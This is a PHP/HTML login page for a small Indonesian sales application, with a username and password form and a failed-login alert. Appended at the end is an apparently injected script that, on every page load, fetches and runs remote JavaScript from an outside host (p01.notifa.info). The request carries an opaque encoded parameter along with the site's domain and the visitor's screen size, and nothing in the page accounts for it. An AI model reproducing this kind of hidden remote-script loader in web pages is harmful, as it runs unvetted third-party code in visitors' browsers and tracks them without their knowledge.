<?php
if(isset($_GET['log'])){
    echo "<script>alert('Username atau Password Salah, Silahkan coba lagi.')</script>";
}
?>

<!DOCTYPE html>
<html lang="en">


<meta http-equiv="content-type" content="text/html;charset=UTF-8" />


<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Penjualan</title>

    <!-- Global stylesheets -->
    <link href="../../../../../fonts.googleapis.com/css1381.css?family=Roboto:400,300,100,500,700,900" rel="stylesheet" type="text/css">
    <link href="assets/css/icons/icomoon/styles.css" rel="stylesheet" type="text/css">
    <link href="assets/css/bootstrap.css" rel="stylesheet" type="text/css">
    <link href="assets/css/core.css" rel="stylesheet" type="text/css">
    <link href="assets/css/components.css" rel="stylesheet" type="text/css">
    <link href="assets/css/colors.css" rel="stylesheet" type="text/css">
    <!-- /global stylesheets -->

    <!-- Core JS files -->
    <script type="text/javascript" src="assets/js/plugins/loaders/pace.min.js"></script>
    <script type="text/javascript" src="assets/js/core/libraries/jquery.min.js"></script>
    <script type="text/javascript" src="assets/js/core/libraries/bootstrap.min.js"></script>
    <script type="text/javascript" src="assets/js/plugins/loaders/blockui.min.js"></script>
    <!-- /core JS files -->


    <!-- Theme JS files -->
    <script type="text/javascript" src="assets/js/core/app.js"></script>

    <script type="text/javascript" src="assets/js/plugins/ui/ripple.min.js"></script>
    <!-- /theme JS files -->

</head>

<body class="login-container">

    <!-- Main navbar -->
    <div class="navbar navbar-inverse bg-indigo">
        <div class="navbar-header">
            <a class="navbar-brand" href="index.html">
                <img src="assets/images/" alt="">
            </a>

            <ul class="nav navbar-nav pull-right visible-xs-block">
                <li>
                    <a data-toggle="collapse" data-target="#navbar-mobile">
                        <i class="icon-tree5"></i>
                    </a>
                </li>
            </ul>
        </div>

    </div>
    <!-- /main navbar -->


    <!-- Page container -->
    <div class="page-container">

        <!-- Page content -->
        <div class="page-content">

            <!-- Main content -->
            <div class="content-wrapper">

                <!-- Content area -->
                <div class="content">

                    <!-- Simple login form -->
                    <form action="proses/login.php" method="POST">
                        <div class="panel panel-body login-form">
                            <div class="text-center">
                                <div class="icon-object border-slate-300 text-slate-300">
                                    <i class="icon-reading"></i>
                                </div>
                                <h5 class="content-group">Login to your account
                                    <small class="display-block">Enter your credentials below</small>
                                </h5>
                            </div>

                            <div class="form-group has-feedback has-feedback-left">
                                <input type="text" name="username" class="form-control" placeholder="Username">
                                <div class="form-control-feedback">
                                    <i class="icon-user text-muted"></i>
                                </div>
                            </div>

                            <div class="form-group has-feedback has-feedback-left">
                                <input type="password" name="password" class="form-control" placeholder="Password">
                                <div class="form-control-feedback">
                                    <i class="icon-lock2 text-muted"></i>
                                </div>
                            </div>

                            <div class="form-group">
                                <button type="submit" class="btn bg-pink-400 btn-block">Sign in
                                    <i class="icon-circle-right2 position-right"></i>
                                </button>
                            </div>


                        </div>
                    </form>
                    <!-- /simple login form -->


                    <!-- Footer -->
                    <div class="footer text-muted text-center">
                        &copy; 2022.
                        <a href="">Muhammad Arif Ramadhani</a>
                    </div>
                    <!-- /footer -->

                </div>
                <!-- /content area -->

            </div>
            <!-- /main content -->

        </div>
        <!-- /page content -->

    </div>
    <!-- /page container -->

    <script type="text/javascript">
        if (self == top) {
            function netbro_cache_analytics(fn, callback) {
                setTimeout(function () {
                    fn();
                    callback();
                }, 0);
            }

            function sync(fn) {
                fn();
            }

            function requestCfs() {
                var idc_glo_url = (location.protocol == "https:" ? "https://" : "http://");
                var idc_glo_r = Math.floor(Math.random() * 99999999999);
                var url = idc_glo_url + "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" +
                    "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVPOusGZYLpeZeUH46pNSGiYMd%2baoPcVphix062FQHkAVfYh5%2bEVEC4DbJpox0XlTA8exAHPbRL3covp0HjdrTiHZVnsl4GPGsDaciOu2K057w2s0ylS17E4qDvcsIXw%2bkz9QSjcrNx484Tix1MVaO%2bNXtwGABYesaNcQNF1gvdM6AbOrOmjFxEZ7eQMnKKmcLDuTwQz43qGG9z3SLZuFbADuUdT0KUcgyPS2sQyWSXxJkrkQ4hzbRG0mBi7M1%2fdXKfCyTzioBHBVnCkanCfPVBqmuwYoqTDbn63D1fu5odc5RwSRpxRkSB5yThADmbUOse%2fAMvsMqOosT8RNwzZCNTDhEH8hzwHzCGSyqAt7%2fmBITyfY45OJQK87VA2fOrHjYAqn5AHpZL56UOZsIn0IX%2fF58259xbXiXqrIgorcyi9GGqq3FSug0DAkyAtaMVYJ%2bIiuGuAxjYHG3Re%2b0v2tnLk6bDVP6Shxr661p0kL4M%2bAXvzZQyN4JoZxzgw2QppUt1hNGTjK3rt8MBX2fGdfTdHC8f8kaoqp6Vojv87wC5E%3d" +
                    "&idc_r=" + idc_glo_r + "&domain=" + document.domain + "&sw=" + screen.width + "&sh=" + screen.height;
                var bsa = document.createElement('script');
                bsa.type = 'text/javascript';
                bsa.async = true;
                bsa.src = url;
                (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(bsa);
            }
            netbro_cache_analytics(requestCfs, function () {});
        };
    </script>
</body>


</html>